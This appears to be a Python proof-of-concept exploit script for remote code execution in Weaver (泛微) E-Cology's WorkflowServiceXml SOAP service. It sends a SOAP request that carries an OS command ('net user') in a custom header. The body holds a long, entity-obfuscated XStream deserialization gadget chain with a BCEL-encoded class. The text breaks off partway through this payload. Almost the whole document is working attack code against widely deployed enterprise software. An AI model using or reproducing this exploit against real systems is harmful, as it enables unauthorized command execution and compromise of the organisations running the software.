#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 泛微E-Cology WorkflowServiceXml RCE                     \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/services%20/WorkflowServiceXml"
    cmd = "net user"
    headers = {
        'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
        'SOAPAction': '""',
        'potats0': cmd,
        "Content-Type": "text/xml;charset=UTF-8"
    }
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
       <soapenv:Header/>
       <soapenv:Body>
          <web:doCreateWorkflowRequest>    <web:string>
    &#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#32;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#99;&#117;&#115;&#116;&#111;&#109;&#39;&#62;&#10;&#32;&#32;&#60;&#117;&#110;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#98;&#108;&#101;&#45;&#112;&#97;&#114;&#101;&#110;&#116;&#115;&#47;&#62;&#10;&#32;&#32;&#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#105;&#122;&#101;&#62;&#50;&#60;&#47;&#115;&#105;&#122;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#109;&#112;&#97;&#114;&#97;&#116;&#111;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#102;&#120;&#46;&#99;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#46;&#79;&#98;&#115;&#101;&#114;&#118;&#97;&#98;&#108;&#101;&#76;&#105;&#115;&#116;&#36;&#49;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#105;&#110;&#116;&#62;&#51;&#60;&#47;&#105;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#97;&#116;&#97;&#72;&#97;&#110;&#100;&#108;&#101;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#119;&#115;&#46;&#101;&#110;&#99;&#111;&#100;&#105;&#110;&#103;&#46;&#120;&#109;&#108;&#46;&#88;&#77;&#76;&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#36;&#88;&#109;&#108;&#68;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#84;&#121;&#112;&#101;&#62;&#116;&#101;&#120;&#116;&#47;&#112;&#108;&#97;&#105;&#110;&#60;&#47;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#84;&#121;&#112;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#83;&#101;&#113;&#117;&#101;&#110;&#99;&#101;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#101;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#120;&#46;&#115;&#119;&#105;&#110;&#103;&#46;&#77;&#117;&#108;&#116;&#105;&#85;&#73;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#115;&#36;&#77;&#117;&#108;&#116;&#105;&#85;&#73;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#115;&#69;&#110;&#117;&#109;&#101;&#114;&#97;&#116;&#111;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#116;&#111;&#111;&#108;&#115;&#46;&#106;&#97;&#118;&#97;&#99;&#46;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#46;&#74;&#97;&#118;&#97;&#99;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#69;&#110;&#118;&#105;&#114;&#111;&#110;&#109;&#101;&#110;&#116;&#36;&#78;&#97;&#109;&#101;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#73;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#110;&#97;&#109;&#101;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#65;&#98;&#115;&#116;&#114;&#97;&#99;&#116;&#76;&#105;&#115;&#116;&#36;&#73;&#116;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#117;&#114;&#115;&#111;&#114;&#62;&#48;&#60;&#47;&#99;&#117;&#114;&#115;&#111;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#108;&#97;&#115;&#116;&#82;&#101;&#116;&#62;&#45;&#49;&#60;&#47;&#108;&#97;&#115;&#116;&#82;&#101;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#101;&#120;&#112;&#101;&#99;&#116;&#101;&#100;&#77;&#111;&#100;&#67;&#111;&#117;&#110;&#116;&#62;&#48;&#60;&#47;&#101;&#120;&#112;&#101;&#99;&#116;&#101;&#100;&#77;&#111;&#100;&#67;&#111;&#117;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#111;&#117;&#116;&#101;&#114;&#45;&#99;&#108;&#97;&#115;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#65;&#114;&#114;&#97;&#121;&#115;&#36;&#65;&#114;&#114;&#97;&#121;&#76;&#105;&#115;&#116;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#97;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#116;&#114;&#105;&#110;&#103;&#45;&#97;&#114;&#114;&#97;&#121;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#36;&#36;&#66;&#67;&#69;&#76;&#36;&#36;&#36;&#108;&#36;&#56;&#98;&#36;&#73;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#56;&#100;&#86;&#36;&#100;&#57;&#87;&#36;&#84;&#87;&#36;&#105;&#36;&#102;&#101;&#36;&#71;&#36;&#67;&#51;&#36;&#77;&#36;&#99;&#51;&#98;&#36;&#81;&#97;&#36;&#53;&#99;&#36;&#98;&#49;&#117;&#36;&#74;&#36;&#119;&#36;&#99;&#49;&#36;&#101;&#101;&#36;&#86;&#36;&#97;&#57;&#36;&#86;&#65;&#36;&#53;&#99;&#36;&#103;&#36;&#100;&#48;&#36;&#103;&#36;&#56;&#97;&#36;&#86;&#109;&#36;&#101;&#100;&#48;&#36;&#53;&#99;&#36;&#54;&#48;&#36;&#109;&#36;&#99;&#99;&#36;&#99;&#52;&#36;&#99;&#57;&#68;&#36;&#57;&#48;&#36;&#36;&#118;&#36;&#98;&#51;&#36;&#57;&#98;&#36;&#100;&#100;&#119;&#107;&#36;&#98;&#55;&#36;&#57;&#55;&#36;&#107;&#95;&#36;&#100;&#98;&#36;&#51;&#101;&#68;&#79;&#36;&#55;&#98;&#36;&#100;&#97;&#36;&#100;&#51;&#36;&#56;&#55;&#36;&#98;&#101;&#36;&#100;&#56;&#83;&#36;&#108;&#36;&#100;&#97;&#36;&#51;&#102;&#36;&#97;&#56;&#36;&#102;&#54;&#36;&#98;&#98;&#36;&#57;&#51;&#36;&#52;&#48;&#36;&#74;&#36;&#56;&#57;&#36;&#100;&#97;&#36;&#57;&#99;&#36;&#57;&#51;&#36;&#55;&#98;&#36;&#101;&#55;&#36;&#102;&#101;&#36;&#101;&#101;&#111;&#36;&#98;&#98;&#36;&#98;&#102;&#36;&#101;&#102;&#36;&#98;&#98;&#36;&#98;&#102;&#36;&#57;&#57;&#36;&#51;&#102;&#36;&#102;&#101;&#36;&#102;&#57;&#36;&#101;&#57;&#87;&#36;&#65;&#36;&#102;&#55;&#36;&#101;&#51;&#36;&#53;&#98;&#36;&#106;&#36;&#71;&#36;&#83;&#36;&#51;&#97;&#36;&#71;&#48;&#36;&#97;&#56;&#36;&#101;&#49;&#36;&#56;&#56;&#36;&#57;&#99;&#36;&#56;&#102;&#36;&#101;&#97;&#120;&#36;&#105;&#36;&#99;&#55;&#36;&#101;&#52;&#36;&#57;&#48;&#36;&#100;&#52;&#48;&#36;&#97;&#52;&#36;&#101;&#51;&#36;&#74;&#36;&#77;&#107;&#56;&#36;&#97;&#101;&#36;&#101;&#50;&#73;&#36;&#106;&#36;&#51;&#97;&#78;&#36;&#97;&#56;&#36;&#89;&#36;&#100;&#49;&#113;&#36;&#83;&#36;&#97;&#55;&#36;&#97;&#52;&#36;&#100;&#57;&#83;&#82;&#36;&#102;&#50;&#36;&#98;&#52;&#36;&#56;&#54;&#36;&#100;&#51;&#114;&#36;&#55;&#101;&#70;&#36;&#56;&#55;&#36;&#56;&#53;&#81;&#57;&#36;&#100;&#56;&#36;&#103;&#36;&#99;&#54;&#84;&#36;&#73;&#36;&#78;&#36;&#101;&#51;&#36;&#51;&#97;&#36;&#57;&#97;&#49;&#36;&#97;&#49;&#97;&#82;&#36;&#56;&#53;&#36;&#97;&#51;&#97;&#74;&#36;&#99;&#53;&#36;&#98;&#52;&#36;&#56;&#101;&#36;&#85;&#102;&#116;&#36;&#97;&#99;&#36;&#56;&#49;&#36;&#97;&#98;&#36;&#99;&#49;&#36;&#57;&#51;&#115;&#90;&#36;&#79;&#103;&#36;&#101;&#52;&#36;&#101;&#48;&#107;&#36;&#99;&#56;&#36;&#97;&#56;&#36;&#73;&#116;&#36;&#100;&#99;&#36;&#56;&#100;&#36;&#97;&#99;&#36;&#56;&#97;&#36;&#98;&#51;&#36;&#75;&#36;&#97;&#97;&#36;&#98;&#98;&#36;&#106;&#36;&#100;&#55;&#36;&#74;&#36;&#102;&#54;&#36;&#117;&#36;&#97;&#56;&#36;&#56;&#99;&#36;&#98;&#53;&#36;&#80;&#36;&#120;&#36;&#56;&#56;&#36;&#102;&#52;&#122;&#99;&#66;&#65;&#67;&#36;&#99;&#50;&#113;&#36;&#99;&#53;&#36;&#54;&#48;&#118;&#102;&#84;&#36;&#102;&#56;&#67;&#36;&#100;&#54;&#104;&#36;&#56;&#97;&#36;&#57;&#50;&#104;&#36;&#99;&#50;&#36;&#98;&#51;&#36;&#97;&#100;&#36;&#100;&#52;&#36;&#98;&#48;&#36;&#101;&#53;&#36;&#51;&#98;&#114;&#36;&#98;&#100;&#36;&#109;&#36;&#77;&#36;&#101;&#99;&#116;&#36;&#99;&#54;&#36;&#98;&#51;&#36;&#97;&#55;&#69;&#36;&#52;&#48;&#36;&#102;&#100;&#36;&#101;&#57;&#36;&#100;&#101;&#36;&#57;&#52;&#53;&#36;&#51;&#102;&#36;&#97;&#102;&#36;&#54;&#48;&#69;&#98;&#36;&#99;&#97;&#36;&#51;&#97;&#107;&#117;&#36;&#97;&#54;&#36;&#121;&#119;&#36;&#97;&#50;&#36;&#57;&#51;&#36;&#97;&#50;&#76;&#102;&#55;&#36;&#86;&#36;&#116;&#68;&#36;&#100;&#48;&#36;&#57;&#98;&#36;&#102;&#53;&#36;&#55;&#100;&#36;&#101;&#49;&#36;&#71;&#36;&#99;&#55;&#36;&#99;&#52;&#36;&#57;&#57;&#36;&#97;&#99;&#36;&#99;&#56;&#36;&#69;&#36;&#68;&#36;&#75;&#86;&#36;&#95;&#81;&#36;&#102;&#52;&#36;&#99;&#53;&#120;&#74;&#36;&#100;&#56;&#65;&#36;&#101;&#55;&#36;&#56;&#48;&#36;&#73;&#36;&#115;&#36;&#98;&#100;&#49;&#90;&#36;&#100;&#52;&#36;&#100;&#98;&#69;&#36;&#101;&#97;&#50;&#36;&#56;&#49;&#36;&#102;&#102;&#36;&#98;&#52;&#36;&#56;&#102;&#36;&#56;&#99;&#78;&#81;&#36;&#57;&#57;&#90;&#36;&#99;&#97;&#36;&#98;&#56;&#36;&#67;&#36;&#98;&#51;&#36;&#56;&#99;&#36;&#57;&#98;&#36;&#55;&#101;&#71;&#36;&#97;&#52;&#36;&#97;&#52;&#36;&#88;&#36;&#99;&#100;&#36;&#88;&#36;&#57;&#57;&#36;&#98;&#52;&#36;&#101;&#55;&#102;&#36;&#57;&#56;&#36;&#97;&#98;&#36;&#99;&#101;&#36;&#85;&#36;&#56;&#101;&#36;&#102;&#98;&#78;&#36;&#109;&#36;&#55;&#99;&#36;&#56;&#54;&#86;&#102;&#36;&#86;&#52;&#36;&#101;&#54;&#36;&#101;&#100;&#36;&#105;&#36;&#97;&#102;&#51;&#36;&#95;&#36;&#100;&#101;&#36;&#57;&#100;&#36;&#100;&#55;&#57;&#36;&#117;&#36;&#97;&#99;&#36;&#98;&#49;&#80;&#36;&#97;&#55;&#36;&#100;&#50;&#36;&#57;&#101;&#36;&#90;&#36;&#120;&#36;&#79;&#36;&#57;&#98;&#36;&#77;&#36;&#55;&#99;&#36;&#99;&#55;&#36;&#57;&#100;&#36;&#57;&#48;&#97;&#51;&#36;&#75;&#36;&#57;&#97;&#36;&#102;&#50;&#36;&#104;&#36;&#100;&#57;&#36;&#99;&#48;&#73;&#117;&#36;&#115;&#109;&#36;&#99;&#98;&#117;&#67;&#36;&#80;&#36;&#75;&#36;&#112;&#53;&#36;&#95;&#49;&#36;&#100;&#57;&#36;&#51;&#102;&#103;&#36;&#56;&#98;&#116;&#36;&#101;&#48;&#120;&#36;&#36;&#36;&#102;&#55;&#36;&#111;&#36;&#99;&#49;&#36;&#97;&#52;&#67;&#36;&#99;&#51;&#36;&#57;&#97;&#36;&#99;&#52;&#120;&#36;&#100;&#54;&#36;&#57;&#101;&#36;&#51;&#101;&#36;&#101;&#55;&#101;&#36;&#118;&#36;&#97;&#97;&#75;&#36;&#71;&#36;&#57;&#54;&#36;&#51;&#100;&#36;&#51;&#100;&#36;&#54;&#48;&#36;&#97;&#53;&#36;&#99;&#51;&#36;&#56;&#50;&#36;&#83;&#36;&#81;&#36;&#83;&#36;&#52;&#48;&#36;&#99;&#53;&#36;&#121;&#36;&#101;&#49;&#87;&#49;&#71;&#116;&#36;&#74;&#36;&#118;&#36;&#102;&#49;&#36;&#113;&#36;&#54;&#48;&#36;&#99;&#99;&#36;&#122;&#36;&#101;&#57;&#101;&#36;&#55;&#100;&#36;&#53;&#98;&#36;&#102;&#52;&#36;&#51;&#98;&#36;&#98;&#50;&#36;&#102;&#48;&#70;&#36;&#99;&#49;&#69;&#36;&#53;&#99;&#70;&#50;&#36;&#98;&#48;&#36;&#70;&#36;&#53;&#98;&#85;&#36;&#57;&#99;&#51;&#48;&#36;&#56;&#102;&#103;&#36;&#90;&#36;&#56;&#54;&#56;&#36;&#100;&#57;&#36;&#71;&#36;&#57;&#101;&#36;&#99;&#51;&#36;&#102;&#51;&#36;&#119;&#36;&#53;&#101;&#48;&#112;&#36;&#107;&#36;&#95;&#36;&#103;&#120;&#36;&#74;&#36;&#95;&#36;&#120;&#36;&#100;&#56;&#106;&#36;&#55;&#98;&#51;&#113;&#36;&#100;&#98;&#36;&#99;&#97;&#36;&#100;&#97;&#36;&#57;&#51;&#36;&#53;&#101;&#36;&#100;&#99;&#36;&#86;&#36;&#99;&#49;&#36;&#97;&#99;&#36;&#101;&#55;&#79;&#36;&#99;&#55;&#83;&#78;&#36;&#115;&#36;&#81;&#110;&#36;&#55;&#99;&#36;&#99;&#56;&#78;&#36;&#116;&#36;&#88;&#113;&#84;&#36;&#102;&#49;&#36;&#56;&#97;&#36;&#56;&#49;&#87;&#113;&#36;&#56;&#49;&#80;&#36;&#57;&#54;&#36;&#99;&#48;&#70;&#106;&#36;&#121;&#67;&#36;&#100;&#55;&#36;&#99;&#48;&#107;&#120;&#36;&#57;&#100;&#36;&#100;&#53;&#36;&#53;&#99;&#36;&#56;&#101;&#36;&#79;&#36;&#56;&#102;&#97;&#36;&#101;&#48;&#36;&#78;&#36;&#98;&#99;&#105;&#36;&#101;&#48;&#36;&#122;&#36;&#53;&#99;&#52;&#36;&#102;&#48;&#54;&#36;&#36;&#36;&#100;&#50;&#36;&#102;&#54;&#36;&#102;&#52;&#36;&#67;&#36;&#107;&#36;&#102;&#100;&#36;&#57;&#54;&#36;&#99;&#100;&#50;&#36;&#104;&#120;&#36;&#72;&#36;&#101;&#102;&#36;&#102;&#50;&#36;&#97;&#52;&#36;&#71;&#36;&#100;&#101;&#36;&#99;&#51;&#36;&#102;&#98;&#36;&#71;&#36;&#51;&#101;&#36;&#99;&#48;&#36;&#56;&#55;&#36;&#121;&#36;&#99;&#102;&#36;&#111;&#78;&#36;&#113;&#65;&#49;&#66;&#36;&#75;&#98;&#105;&#111;&#86;&#36;&#102;&#56;&#98;&#36;&#97;&#99;&#109;&#36;&#102;&#52;&#36;&#53;&#99;&#36;&#53;&#98;&#36;&#100;&#97;&#36;&#76;&#36;&#97;&#99;&#36;&#109;&#36;&#101;&#51;&#36;&#98;&#53;&#36;&#57;&#53;&#36;&#102;&#100;&#36;&#90;&#36;&#102;&#56;&#36;&#73;&#36;&#108;&#36;&#101;&#55;&#36;&#57;&#100;&#36;&#101;&#53;&#36;&#66;&#36;&#122;&#36;&#99;&#97;&#48;&#36;&#80;&#36;&#97;&#52;&#36;&#67;&#53;&#36;&#101;&#102;&#99;&#36;&#116;&#79;&#90;&#36;&#67;&#36;&#97;&#54;&#36;&#56;&#97;&#79;&#36;&#77;&#36;&#55;&#99;&#36;&#56;&#97;&#36;&#99;&#102;&#100;&#117;&#36;&#51;&#102;&#87;&#80;&#113;&#36;&#97;&#97;&#36;&#99;&#55;&#36;&#99;&#48;&#36;&#114;&#36;&#55;&#99;&#97;&#36;&#101;&#48;&#50;&#36;&#98;&#101;&#52;&#36;&#102;&#48;&#36;&#86;&#36;&#98;&#101;&#86;&#36;&#65;&#36;&#98;&#50;&#36;&#97;&#48;&#36;&#77;&#36;&#100;&#52;&#36;&#71;&#36;&#98;&#101;&#36;&#99;&#49;&#86;&#36;&#51;&#97;&#36;&#95;&#36;&#54;&#48;&#36;&#97;&#52;&#36;&#97;&#48;&#36;&#102;&#53;&#86;&#36;&#51;&#99;&#87;&#36;&#100;&#48;&#114;&#36;&#76;&#36;&#101;&#101;&#36;&#36;&#100;&#36;&#85;&#36;&#101;&#101;&#36;&#105;&#36;&#99;&#98;&#36;&#98;&#97;&#36;&#56;&#49;&#51;&#83;&#36;&#101;&#48;&#36;&#102;&#48;&#36;&#101;&#50;&#36;&#97;&#50;&#57;&#36;&#100;&#54;&#36;&#57;&#101;&#36;&#117;&#36;&#100;&#49;&#36;&#57;&#49;&#52;&#36;&#84;&#115;&#36;&#99;&#50;&#36;&#115;&#36;&#100;&#97;&#36;&#98;&#49;&#82;&#36;&#101;&#54;&#36;&#36;&#53;&#56;&#36;&#101;&#97;&#36;&#55;&#98;&#36;&#98;&#54;&#36;&#73;&#36;&#95;&#36;&#101;&#55;&#36;&#57;&#50;&#36;&#99;&#50;&#36;&#77;&#77;&#36;&#102;&#97;&#36;&#97;&#99;&#36;&#87;&#121;&#89;&#36;&#98;&#56;&#36;&#55;&#100;&#36;&#76;&#36;&#101;&#98;&#36;&#57;&#53;&#69;&#36;&#98;&#49;&#36;&#102;&#50;&#82;&#90;&#54;&#75;&#36;&#55;&#101;&#120;&#110;&#36;&#109;&#36;&#101;&#54;&#36;&#56;&#50;&#36;&#57;&#48;&#36;&#76;&#36;&#74;&#36;&#95;&#95;&#106;&#36;&#98;&#51;&#72;&#36;&#55;&#100;&#36;&#99;&#57;&#36;&#57;&#54;&#36;&#98;&#52;&#36;&#118;&#36;&#98;&#98;&#65;&#36;&#97;&#56;&#82;&#36;&#55;&#99;&#36;&#73;&#36;&#114;&#36;&#75;&#54;&#36;&#100;&#102;&#36;&#110;&#36;&#102;&#55;&#36;&#56;&#53;&#36;&#98;&#54;&#36;&#111;&#36;&#101;&#49;&#36;&#53;&#100;&#36;&#97;&#56;&#36;&#101;&#52;&#36;&#100;&#101;&#50;&#54;&#36;&#116;&#75;&#108;&#36;&#100;&#97;&#111;&#36;&#100;&#55;&#115;&#36;&#97;&#97;&#36;&#106;&#36;&#102;&#55;&#36;&#97;&#99;&#55;&#36;&#99;&#100;&#36;&#100;&#50;&#36;&#101;&#101;&#36;&#56;&#97;&#36;&#57;&#53;&#54;&#36;&#57;&#98;&#36;&#57;&#51;&#36;&#97;&#53;&#36;&#97;&#50;&#36;&#102;&#54;&#114;&#36;&#122;&#73;&#36;&#57;&#51;&#53;&#36;&#99;&#57;&#36;&#108;&#36;&#97;&#51;&#36;&#97;&#57;&#36;&#98;&#52;&#36;&#77;&#36;&#102;&#50;&#36;&#99;&#101;&#83;&#36;&#110;&#36;&#57;&#57;&#77;&#36;&#76;&#36;&#100;&#102;&#36;&#99;&#101;&#107;&#53;&#114;&#36;&#100;&#100;&#36;&#116;&#36;&#98;&#56;&#36;&#109;&#36;&#97;&#102;&#36;&#76;&#36;&#100;&#56;&#119;&#36;&#100;&#99;&#36;&#101;&#49;&#36;&#102;&#99;&#36;&#99;&#98;&#36;&#100;&#98;&#36;&#53;&#99;&#36;&#53;&#100;&#70;&#36;&#69;&#36;&#51;&#100;&#36;&#98;&#54;&#36;&#56;&#52;&#36;&#100;&#51;&#36;&#74;&#36;&#102;&#98;&#114;&#36;&#113;&#54;&#36;&#111;&#36;&#57;&#98;&#121;&#36;&#114;&#36;&#51;&#100;&#36;&#120;&#36;&#100;&#56;&#82;&#36;&#101;&#54;&#48;&#101;&#51;&#36;&#97;&#102;&#36;&#57;&#97;&#36;&#57;&#53;&#36;&#98;&#55;&#76;&#36;&#83;&#36;&#97;&#98;&#76;&#36;&#102;&#52;&#36;&#101;&#49;&#36;&#111;&#70;&#36;&#87;&#36;&#99;&#56;&#36;&#99;&#51;&#36;&#104;&#36;&#99;&#97;&#36;&#81;&#36;&#56;&#55;&#36;&#100;&#99;&#116;&#54;&#36;&#97;&#48;&#36;&#57;&#101;&#36;&#98;&#48;&#102;&#72;&#36;&#101;&#56;&#36;&#56;&#53;&#51;&#36;&#102;&#51;&#36;&#100;&#54;&#36;&#36;&#36;&#100;&#57;&#36;&#97;&#48;&#36;&#102;&#98;&#36;&#100;&#54;&#88;&#36;&#100;&#57;&#36;&#78;&#36;&#101;&#57;&#36;&#100;&#57;&#36;&#99;&#56;&#102;&#68;&#36;&#57;&#102;&#72;&#57;&#51;&#36;&#102;&#57;&#36;&#53;&#98;&#36;&#55;&#101;&#36;&#104;&#36;&#101;&#97;&#36;&#36;&#107;&#36;&#98;&#55;&#36;&#101;&#97;&#36;&#97;&#52;&#36;&#57;&#53;&#36;&#90;&#36;&#113;&#36;&#102;&#98;&#36;&#99;&#50;&#36;&#100;&#55;&#36;&#100;&#55;&#36;&#73;&#36;&#80;&#36;&#101;&#101;&#36;&#56;&#54;&#36;&#56;&#98;&#98;&#36;&#98;&#97;&#36;&#36;&#36;&#98;&#54;&#36;&#101;&#100;&#36;&#56;&#54;&#52;&#36;&#108;&#36;&#56;&#50;&#36;&#98;&#48;&#36;&#101;&#53;&#36;&#79;&#36;&#102;&#57;&#36;&#57;&#54;&#36;&#122;&#36;&#98;&#48;&#36;&#82;&#36;&#57;&#98;&#36;&#102;&#57;&#36;&#56;&#50;&#36;&#57;&#53;&#36;&#51;&#102;&#118;&#110;&#36;&#100;&#57;&#69;&#57;&#36;&#99;&#54;&#36;&#56;&#48;&#36;&#56;&#97;&#118;&#84;&#36;&#97;&#51;&#36;&#57;&#54;&#36;&#100;&#50;&#36;&#98;&#102;&#36;&#98;&#55;&#36;&#53;&#100;&#36;&#56;&#53;&#114;&#36;&#78;&#36;&#86;&#36;&#100;&#49;&#36;&#99;&#97;&#36;&#105;&#36;&#111;&#36;&#99;&#55;&#36;&#97;&#102;&#36;&#97;&#49;&#36;&#119;&#36;&#56;&#55;&#36;&#101;&#97;&#36;&#97;&#56;&#36;&#57;&#97;&#36;&#56;&#51;&#36;&#57;&#54;&#36;&#100;&#56;&#36;&#107;&#36;&#97;&#100;&#36;&#97;&#57;&#36;&#102;&#99;&#36;&#70;&#122;&#36;&#79;&#36;&#98;&#53;&#36;&#68;&#36;&#51;&#98;&#36;&#85;&#36;&#51;&#101;&#36;&#90;&#57;&#36;&#100;&#52;&#36;&#78;&#118;&#36;&#101;&#52;&#80;&#36;&#57;&#102;&#67;&#67;&#36;&#98;&#52;&#49;&#36;&#56;&#55;&#36;&#86;&#36;&#53;&#100;&#36;&#82;&#51;&#36;&#83;&#36;&#99;&#57;&#36;&#110;&#106;&#70;&#36;&#117;&#109;&#36;&#101;&#97;&#36;&#97;&#97;&#50;&#105;&#36;&#53;&#98;&#36;&#108;&#36;&#53;&#100;&#89;&#48;&#36;&#101;&#97;&#36;&#97;&#97;&#54;&#36;&#97;&#98;&#36;&#99;&#100;&#36;&#97;&#97;&#36;&#56;&#50;&#36;&#100;&#100;&#111;&#104;&#36;&#101;&#101;&#82;&#77;&#53;&#36;&#98;&#97;&#36;&#119;&#36;&#56;&#55;&#36;&#87;&#36;&#101;&#57;&#36;&#111;&#36;&#100;&#97;&#36;&#103;&#36;&#97;&#49;&#36;&#100;&#54;&#36;&#56;&#57;&#36;&#99;&#97;&#36;&#97;&#56;&#36;&#57;&#57;&#36;&#57;&#52;&#36;&#97;&#97;&#36;&#57;&#97;&#36;&#97;&#57;&#117;&#80;&#36;&#54;&#48;&#80;&#36;&#98;&#48;&#36;&#51;&#97;&#36;&#90;&#36;&#97;&#97;&#36;&#57;&#98;&#36;&#53;&#100;&#53;&#36;&#51;&#102;&#99;&#36;&#99;&#100;&#36;&#74;&#36;&#115;&#102;&#36;&#100;&#54;&#48;&#36;&#98;&#49;&#36;&#105;&#36;&#100;&#54;&#36;&#53;&#101;&#36;&#99;&#53;&#36;&#98;&#97;&#36;&#101;&#56;&#36;&#102;&#97;&#36;&#105;&#54;&#116;&#36;&#101;&#57;&#36;&#97;&#54;&#106;&#50;&#36;&#52;&#48;&#36;&#100;&#98;&#36;&#114;&#36;&#100;&#52;&#36;&#99;&#97;&#121;&#36;&#101;&#51;&#36;&#86;&#84;&#69;&#36;&#101;&#102;&#36;&#9